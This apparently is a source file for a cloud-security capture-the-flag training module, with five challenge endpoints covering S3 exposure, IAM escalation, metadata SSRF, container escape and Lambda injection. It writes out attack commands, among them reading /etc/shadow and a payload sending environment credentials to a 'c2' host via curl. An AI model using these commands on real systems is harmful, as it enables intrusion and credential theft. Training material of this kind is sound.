/**
 * Cloud Security Deep Dive Module
 * Covers: AWS, Azure, GCP misconfigurations, IAM abuse, container security
 * Difficulty: Beginner -> Pro
 */

const express = require('express');
const router = express.Router();

router.get('/', (req, res) => {
  res.render('cloud_sec/index', {
    title: 'Cloud Security',
    user: req.session?.user,
  });
});

// CS1: S3 Bucket Public Access (Beginner)
router.get('/s3-public', (req, res) => {
  res.json({
    vuln: 'CS1: Publicly Exposed S3 Bucket',
    level: 'Beginner',
    description:
      'An S3 bucket is configured with public-read ACL, exposing sensitive customer data. Find and list its contents.',
    bucket: 'aivault-customer-backups',
    region: 'us-east-1',
    acl: 'public-read',
    exposed_files: [
      'customer_data.csv',
      'credit_cards_backup.json',
      'aws_keys.env',
      ' Database_dump.sql.gz',
    ],
    command: 'aws s3 ls s3://aivault-customer-backups --no-sign-request',
    hint: 'Try listing without authentication using the AWS CLI with --no-sign-request.',
    flag: 'FLAG{cs01_s3_public_v2w3}',
  });
});

// CS2: IAM Privilege Escalation (Beginner)
router.get('/iam-escalation', (req, res) => {
  res.json({
    vuln: 'CS2: IAM Privilege Escalation via iam:PassRole',
    level: 'Beginner',
    description:
      'A low-privilege role has iam:PassRole + ec2:RunInstances. Pass a high-privilege role to a new EC2 instance.',
    current_policy: {
      policy_name: 'DveloperAccess',
      effect: 'Allow',
      actions: ['ec2:RunInstances', 'iam:PassRole', 'ec2:DescribeInstances'],
    },
    escalation:
      'aws ec2 run-instances --image-id ami-0abcdef --iam-instance-profile Name=AdminRole --instance-type t2.micro',
    hint: 'iam:PassRole lets you attach ANY role to a new EC2 instance — including an admin role.',
    flag: 'FLAG{cs02_iam_escalate_x4y5}',
  });
});

// CS3: SSRF to Cloud Metadata Service (Intermediate)
router.get('/metadata-ssrf', (req, res) => {
  res.json({
    vuln: 'CS3: SSRF to IMDSv1 Metadata Service',
    level: 'Intermediate',
    description:
      'A web app allows URL fetching. Use SSRF to hit the instance metadata service and steal IAM credentials.',
    vulnerable_endpoint:
      'POST /cloud/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    metadata_response: {
      role_name: 'ec2-web-role',
      access_key: 'ASIAIOSFODNN7EXAMPLE',
      secret_key: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
      token: 'AQoDYXdzEPT//////////wEa...',
    },
    hint: 'IMDSv1 is vulnerable to SSRF. IMDSv2 requires a session token header — much harder to exploit.',
    flag: 'FLAG{cs03_metadata_ssrf_z6a7}',
  });
});

// CS4: Container Breakout via Host Path Mount (Advanced)
router.get('/container-breakout', (req, res) => {
  res.json({
    vuln: 'CS4: Container Escape via Host PID + / Mount',
    level: 'Advanced',
    description:
      'A container runs with --privileged and mounts the host root filesystem. Escape to the host.',
    docker_run:
      'docker run --privileged -v /:/host -v /proc:/hostproc --pid=host alpine:latest /bin/sh',
    escape_techniques: [
      'nsenter --target 1 --mount /bin/sh',
      'chroot /host /bin/bash',
      'cat /host/etc/shadow',
      'crontab -e (writes to host crontab via /host/var/spool/cron)',
    ],
    hint: 'With --pid=host and host FS access, you can inject into PID 1 or modify host crontab.',
    flag: 'FLAG{cs04_container_escape_b8c9}',
  });
});

// CS5: Lambda Function Code Injection (Pro)
router.get('/lambda-injection', (req, res) => {
  res.json({
    vuln: 'CS5: Serverless Lambda Code Injection',
    level: 'Pro',
    description:
      'A Lambda function passes user input directly into a subprocess call. Inject a reverse shell that runs in the Lambda environment.',
    vulnerable_code:
      'exports.handler = async (event) => {\n' +
      '  const { exec } = require("child_process");\n' +
      '  const name = event.queryStringParameters.name;\n' +
      '  exec(`echo "Hello, ${name}!"`, (err, stdout) => { ... });\n' +
      '};',
    payload: "name=foo\");require('child_process').exec('curl http://c2/$(env)')//",
    environment_vars_exposed: [
      'AWS_ACCESS_KEY_ID',
      'AWS_SECRET_ACCESS_KEY',
      'AWS_SESSION_TOKEN',
      'AWS_LAMBDA_FUNCTION_NAME',
    ],
    hint: 'Lambda environment variables include temporary IAM credentials — exfiltrate them via OOB DNS.',
    flag: 'FLAG{cs05_lambda_injection_d0e1}',
  });
});

module.exports = router;
